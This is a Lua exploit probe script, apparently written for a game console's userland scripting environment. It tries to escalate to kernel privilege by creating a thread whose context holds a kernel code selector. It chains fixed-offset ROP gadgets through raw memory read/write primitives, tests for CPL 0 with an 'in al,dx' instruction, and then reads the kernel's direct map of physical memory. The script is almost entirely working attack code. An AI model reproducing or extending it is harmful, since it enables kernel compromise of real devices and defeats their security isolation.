-- CRASH_CLASS: RISKY
-- PROBE 725a: does a CS=0x40 thr_create child actually run at CPL 0?
--
-- Context: 189a recorded CS=0x40 producing a live thread with no panic, and the
-- repository concluded from that alone that the firmware substitutes a user
-- selector. Nothing privileged was ever executed to check.
--
-- `in al, dx` is CPL0-only and harmless there: port 0x80 is the POST port and
-- nothing on this console drives it. At CPL 3 the instruction raises #GP and the
-- kernel kills the process, so:
--   child survives and the marker changes -> the child was at CPL 0
--   process dies                          -> the selector was replaced, CPL 3
--
-- Phase [B] runs that test. Phase [C] runs only if [B] survived, and reads the
-- direct-map base of physical 0 through the `mov rax,[rsi];ret` gadget: that is
-- the first kernel read and the proof that the primitive is usable.

print("=== PROBE 725a: CS=0x40 at CPL 0? ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function rq(a) local o,v=pcall(function() return memory.read_qword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end
local function hex64(v) return string.format("%08X_%08X", math.floor(v/4294967296)%4294967296, v%4294967296) end

local fn_ud = syscall.pipe.fn_addr
local fn = to_num(fn_ud)
print("[0] pid=" .. tostring(to_num(native.fcall_with_rax(fn_ud, 20))))

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local ebase = (rd(info+0x10C) or 0)*4294967296 + (rd(info+0x108) or 0)
print("[0] eboot=" .. hex64(ebase))

local IN_DX   = 0x17E6C3   -- in al,dx ; ret
local ST_RAX  = 0x1A0BA9   -- mov [rsi],rax ; ret
local LD_RAX  = 0x1A5CC4   -- mov rax,[rsi] ; ret
local JMP_SELF= nil
do
    local ok, s = pcall(function() return memory.read_buffer(ebase+0x15481, 2) end)
    if ok and s == string.char(0xEB,0xFE) then JMP_SELF = 0x15481 end
end
print(string.format("[0] in al,dx=%X store=%X load=%X jmp$=%s", IN_DX, ST_RAX, LD_RAX,
    JMP_SELF and string.format("%X", JMP_SELF) or "missing"))
if not JMP_SELF then return end

local sc_mmap = mk(477)
local page = 0x4000
local function mmap(px)
    local _, a = pcall(function() return sc_mmap(uint64(0), uint64(px), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
    local v = to_num(a)
    if v ~= 0 then zero(v, px) end
    return v
end
local Ctx = {MAGIC=0x108, TYPE=0x110, CS=0x0C0, RIP=0x0E0, RSP=0x0F8, SS=0x100,
             RDI=0x048, RSI=0x050, RDX=0x058, RAX=0x078}
local ts = memory.alloc(16)
local function sleep_ms(ms) wq(ts,0); wq(ts+8, ms*1000000); pcall(function() mk(240)(uint64(ts), uint64(0)) end) end

-- rip: first gadget; rsi/rdx/rax: registers it starts with; second: the gadget
-- reached by its ret (nil = jmp $ directly after)
local function child(cs, rip, rsi, rdx, rax, second)
    local stack = mmap(page*4)
    local base = stack + page*4 - 0x200
    if second then
        wq(base,   uint64(ebase + second))
        wq(base+8, uint64(ebase + JMP_SELF))
    else
        wq(base, uint64(ebase + JMP_SELF))
    end
    local ctx = memory.alloc(0x500)
    zero(ctx, 0x500)
    wq(ctx+Ctx.MAGIC, uint64(0x480)); wq(ctx+Ctx.TYPE, uint64(0x10000))
    wq(ctx+Ctx.CS, uint64(cs));       wq(ctx+Ctx.SS, uint64(0x3B))
    wq(ctx+Ctx.RIP, uint64(ebase + rip)); wq(ctx+Ctx.RSP, uint64(base))
    wq(ctx+Ctx.RSI, uint64(rsi));     wq(ctx+Ctx.RDX, uint64(rdx))
    wq(ctx+Ctx.RAX, uint64(rax))
    local tb = memory.alloc(8)
    wq(tb, uint64(0))
    local ok, rv = pcall(function() return mk(430)(uint64(ctx), uint64(tb), uint64(0)) end)
    return (ok and to_num(rv) or -999), (rd(tb) or 0)
end

print("")
print("[B] CS=0x40, in al,dx (port 0x80), then store RAX")
local m = mmap(page)
local rv, tid = child(0x40, IN_DX, m, 0x80, 0xDEAD0000, ST_RAX)
print(string.format("[B] thr_create rv=%d tid=%X", rv, tid))
sleep_ms(400)
local mk1, mk2 = rd(m) or 0, rd(m+4) or 0
print(string.format("[B] marker=%08X %08X  alive=%d", mk2, mk1, to_num(native.fcall_with_rax(fn_ud, 20))))
if mk1 ~= 0 or mk2 ~= 0 then
    print("[B] SURVIVED a CPL0-only instruction: the child is at CPL 0")
    print("")
    print("[C] CS=0x40, read [0xFFFFFE0000000000] (direct map of physical 0)")
    local m2 = mmap(page)
    local rv2, tid2 = child(0x40, LD_RAX, 0xFFFFFE0000000000, 0, 0, ST_RAX)
    print(string.format("[C] thr_create rv=%d tid=%X", rv2, tid2))
    sleep_ms(400)
    local a, b = rq(m2) or 0, rq(m2+8) or 0
    print(string.format("[C] dm[0]=%s", hex64(a)))
    print(string.format("[C] dm[8]=%s", hex64(b)))
else
    print("[B] no store: the instruction faulted (or the child never ran)")
end
print("[D] alive=" .. tostring(to_num(native.fcall_with_rax(fn_ud, 20))))
